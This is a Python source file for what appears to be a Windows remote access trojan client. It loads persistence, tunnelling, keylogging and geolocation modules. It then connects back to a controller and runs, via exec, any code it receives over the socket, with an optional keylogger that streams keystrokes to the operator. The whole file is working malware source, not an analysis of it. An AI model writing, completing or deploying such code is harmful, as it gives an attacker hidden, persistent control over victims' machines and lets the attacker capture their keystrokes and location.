from os import name, abort # Quick abort if not windows... Just in case
if not name == 'nt':
    abort()

import socket
from tkinter import messagebox
import sys
from time import sleep

version = 'V0.3.1 BUILD 6'

dokeylog = False

from _modules import location, persistence, tunnel, keylog, kbhit
kbhit = kbhit.KBHit()

tunnelip = '127.0.0.1'
tunnelport = 5000

def connect():
    global s
    s = socket.socket()
    while True:
        try:
            tunnel.start()
            s.connect((tunnelip,tunnelport))
        except:
            timer = 3
            print(f'\rFuck, could not connect...',end='')
            for i in range(3):
                sleep(1)

                print(f'\rTrying again in [{timer}]              ',end='')
                timer = timer - 1


        else:
            print('\n\nConnected :)\n')
            break

# Utility functions for exec
def send(msg): s.send(msg.encode())
def get(msg): send(msg)

def popup(msg,title='Message'):
    messagebox.showinfo(title, f'{msg}',)
def show(msg,title='Message'):
    tunnel.Thread(target=popup,args=(msg,title)).start()

def help():
    send('-- Help menu --\nFunctions:\n\nsend(msg) - Send a message back to server. Aliases: get\npopup(msg) - Send a message via pop up to the user. Aliases: show')


print('[INIT] Enabling modules...\n')


print(f'[MODULES] Enabling Tunnel..')
tunnel.start()

print('[MODULES] Enabling persistence.. ['+sys.argv[0].split("\\")[-1]+']')
persistence.init(sys.argv[0].split('\\')[-1])

if dokeylog:
    print('[MODULES] Enabling Keylog...')
    keylog.start(lambda msg: s.send(f'[KEY] {msg}'.encode()))

print('[MODULES] Enabling Location...')
location.init()

ip = location.ip

print()

print('[INIT] Connecting...')
connect()


while True:
    try:
        msg = s.recv(1024).decode()
        if msg in [None,'']: continue
        msg = ''.join(c for c in msg if c.isprintable())
        try: exec(msg)
        except Exception as e: s.send(f'[ERROR] {e}'.encode())
    except Exception as e:
        try: s.send(f'[ERROR] {e}'.encode())
        except:
            connect()
            







